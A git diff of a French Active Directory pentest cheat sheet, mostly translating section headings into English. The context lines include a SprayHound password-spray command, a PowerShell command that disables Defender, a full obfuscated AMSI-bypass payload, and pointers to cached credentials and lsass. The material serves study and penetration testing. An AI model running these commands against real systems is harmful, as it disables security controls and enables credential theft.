@@ -117,7 +117,7 @@ Get-ADObject -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
 <br>
 
 
-## __Fonctionnement du protocole Kerberos__
+## __KERBEROS PROTOCOL__
 
 
 <p align="center"><img src="img/krbproto.png" alt="img"></p>
@@ -126,7 +126,7 @@ Get-ADObject -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
 
 <br>
 
-# Steal or Forge Kerberos Tickets: Golden Ticket
+## __STEAL KERBEROS TICKETS__
 
 > Outils : Impacket (linux), Rubeus (windows) <br>
 > ATT&CK Tactic : Credential Access <br>
@@ -299,7 +299,7 @@ Domain policy rapport
 
 
 
-## __Comptes AD qui ont le même mot de passe__
+## __AD ACCOUNTS WITH SAME PASSWORD__
 
 > Outil : SprayHound <br>
 > ATT&CK Tactic : Credential Access <br>
@@ -340,7 +340,7 @@ sprayhound -d TSSR-CYBER.FR -dc 10.0.0.1 -lu a.leration -lp 'Tssrcyber1234' -p '
 
 
 
-## __Intercepter un hash NTLMv1 ou NTLMv2__
+## __INTERCEPT NTLMv1 - NTLMv2 HASHS__
 
 
 > Outils : Responder <br>
@@ -404,7 +404,7 @@ __Chemin des logs Responder :__
 
 
 
-## __Se connecter via WinRM sur la machine victime__
+## __WINRM SHELL__
 
 > Outils : <br>
 > ATT&CK Tactic :  <br>
@@ -512,7 +512,6 @@ Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $tr
 
 
 Si vous ne pouvez pas désactiver Defender, voici l'équivalent de la commande précédente mais obfusquée
-
 ```powershell
 #Matt Graebers Reflection method 
 $bncYsK0MlQXwYafCQC=$null;$fR_nvfL="System.$(('Mänä'+'gémè'+'nt').noRMALiZe([cHAR](70)+[ChAr](111+101-101)+[chaR]([byTe]0x72)+[chaR]([bYtE]0x6d)+[Char]([ByTe]0x44)) -replace [CHaR]([BytE]0x5c)+[cHAR]([BYTE]0x70)+[char]([Byte]0x7b)+[CHaR]([BYtE]0x4d)+[cHAR]([byTe]0x6e)+[chaR](125)).$(('Á'+'û'+'t'+'ô'+'m'+'ä'+'t'+'ì'+'ô'+'n').NORmAlIze([cHaR]([Byte]0x46)+[Char](111)+[CHAR]([BYtE]0x72)+[cHaR](109)+[cHAr]([BytE]0x44)) -replace [ChAr](92*4/4)+[cHar](112*19/19)+[CHAr]([bYtE]0x7b)+[cHaR]([bYtE]0x4d)+[CHaR](110+34-34)+[chAR](125)).$([cHAR](65)+[CHaR]([bYTE]0x6d)+[cHaR]([BYTe]0x73)+[CHar](31+74)+[cHaR]([ByTE]0x55)+[chAR]([BYte]0x74)+[chaR](105)+[char](108*9/9)+[CHAR]([ByTe]0x73))";$vjzpibzqpxemahbiucfml="+[cHaR]([bYtE]0x70)+[ChAr]([ByTE]0x68)+[cHar](115*94/94)+[chAr](110*97/97)+[char]([ByTe]0x64)+[cHaR](79+21)+[CHar]([BYTE]0x67)+[CHAr]([bYte]0x7a)+[Char]([Byte]0x68)+[char](46+52)+[CHaR]([BYTE]0x7a)+[ChAr]([BYTE]0x64)+[cHAR](98)+[char]([bYTe]0x6e)+[CHaR](20+87)+[chaR](66+55)+[ChAR]([bYte]0x62)+[chaR]([ByTe]0x73)+[cHAR](118*110/110)+[ChAR](102*56/56)+[Char]([ByTe]0x77)+[cHar](112)";[Threading.Thread]::Sleep(127);[Ref].Assembly.GetType($fR_nvfL).GetField($([cHaR]([Byte]0x61)+[cHAr]([bYTe]0x6d)+[CHAR]([BYte]0x73)+[ChaR](105*91/91)+[CHAR](73+67-67)+[chAR]([BYTe]0x6e)+[CHaR]([BYtE]0x69)+[char]([ByTE]0x74)+[ChAr]([bYte]0x46)+[cHAR]([BytE]0x61)+[CHaR](105*29/29)+[cHaR](108+72-72)+[CHAR]([BYTe]0x65)+[cHAr](100)),"NonPublic,Static").SetValue($bncYsK0MlQXwYafCQC,$true);$ccynxqvpluwhsqrp="+('óx'+'xb'+'âg'+'zy'+'mw'+'zs'+'ín'+'ún'+'rh'+'ûw'+'pf'+'pr'+'qs'+'gd'+'n').normaLIZE([cHAr](4+66)+[cHar]([byTe]0x6f)+[CHaR](114)+[cHAr]([bYtE]0x6d)+[CHar]([Byte]0x44)) -replace [CHar]([BYtE]0x5c)+[CHAR](112*80/80)+[CHAr](65+58)+[cHAR](77+74-74)+[CHaR]([byTe]0x6e)+[ChAr](125)";[Threading.Thread]::Sleep(490)
@@ -555,19 +554,17 @@ INC.
 > [!IMPORTANT]
 > Un compte ayant des privilèges élévés sur le domaine doit toujour se trouver dans le **groupe "Protected Users"** (dans l'OU built-in Users) sinon ces identifiants seront stockés en cache lors de sa connexion sur une machine. Il sera possible d'extraire ses informations avec un outils comme Mimikatz.
 
-Les informations des identifiants en cache sont stockées dans le registre au sein de la clé : HKEY_LOCAL_MACHINE\Security\Cache
-
 
 <br>
 
+
+Les informations des identifiants en cache sont stockées dans le registre au sein de la clé : HKEY_LOCAL_MACHINE\Security\Cache <br>
 Afficher les tickets mis en cache sur la machine
 ```bat
 klist
 ```
 
 <br>
-
-
 
 
 > [!NOTE] Le processus **lsass.exe** (Local Security Authority SubSystem) gère des informations d'identifications qui sont stockées en mémoire.
@@ -772,7 +769,7 @@ INC.
 
 
 
-## __Trouver les SID des utilisateurs et groupes__
+## __FIND USERS & GROUPS SID__
 
 bruteforce the Windows SID through [MS-LSAT] MSRPC Interface 
 
